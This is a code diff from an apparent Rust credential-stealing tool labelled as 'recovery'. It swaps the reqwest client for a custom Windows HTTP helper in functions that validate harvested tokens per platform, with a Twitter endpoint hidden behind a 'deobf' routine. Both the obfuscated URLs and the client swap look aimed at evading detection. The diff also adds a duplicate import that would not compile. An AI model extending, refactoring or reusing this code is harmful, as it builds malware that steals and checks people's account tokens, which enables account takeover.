@@ -6,9 +6,10 @@ use crate::recovery::{
     fs::sanitize_label,
     task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
 };
+use crate::recovery::task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask};
 use async_trait::async_trait;
 use once_cell::sync::Lazy;
-use reqwest::Client;
+use crate::recovery::helpers::winhttp::{Client, Response, Error};
 use rusqlite::{Connection, params};
 use serde_json::{Value, json};
 use std::collections::HashSet;
@@ -260,7 +261,7 @@ async fn validate_token(
     client: &Client,
     platform: &str,
     token: &str,
-) -> Result<Option<ValidationResponse>, reqwest::Error> {
+) -> Result<Option<ValidationResponse>, Error> {
     match platform {
         "twitter" => {
             let twitter_url = deobf(&[
@@ -464,20 +465,20 @@ async fn validate_token(
     }
 }
 
-async fn parse_response(response: reqwest::Response) -> Result<ValidationResponse, reqwest::Error> {
+async fn parse_response(response: Response) -> Result<ValidationResponse, Error> {
     let status = response.status();
     let text = response.text().await?;
     let body = serde_json::from_str(&text).unwrap_or_else(|_| Value::String(text));
     Ok(ValidationResponse {
-        status: status.as_u16(),
+        status: status.to_string().parse().unwrap_or(0),
         body,
     })
 }
 
 async fn parse_validation_response(
     platform: &str,
-    response: reqwest::Response,
-) -> Result<Option<ValidationResponse>, reqwest::Error> {
+    response: Response,
+) -> Result<Option<ValidationResponse>, Error> {
     if response.status().is_success() {
         let parsed = parse_response(response).await?;
         if !is_validation_body_valid(platform, &parsed.body) {
